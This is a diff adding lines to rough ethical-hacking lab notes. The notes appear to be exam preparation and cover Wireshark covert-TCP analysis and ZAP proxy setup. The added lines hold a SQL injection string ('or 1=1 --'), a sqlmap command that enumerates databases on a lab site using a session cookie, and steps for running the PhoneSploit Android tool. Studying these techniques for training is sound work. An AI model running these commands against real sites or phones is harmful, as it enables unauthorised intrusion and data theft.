@@ -33,6 +33,13 @@ Double click and open into the Wireshark in kali
 Enter “tcp” into the bar which will give us all tcp packets.
 Then click on each packet and find word underneath in 2
 nd columns.
+
+
+
+blah' or 1=1 --
+
+
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" -cookie="JSESSIONID=ROMd8ZB5LZP8RivByN4IdA" -dbs
 Then in answer sheet write the port no of both the machine who shared the secret message ---->covert tcp pcapng
 
 
@@ -234,3 +241,16 @@ OWASP Zed Attack Proxy (ZAP)
  Go to settings  local Proxies  Change IP from localhost to network IP (in this case 
 10.10.10.16).
  Browse from victim and view the request and responses on the attacker machine
+
+
+phone sploit
+
+git clone
+cd PhoneSploit
+pip3installcolorama or python3 -m pip install colorama
+python3 phonesploit.py
+3
+4
+pwd
+
+
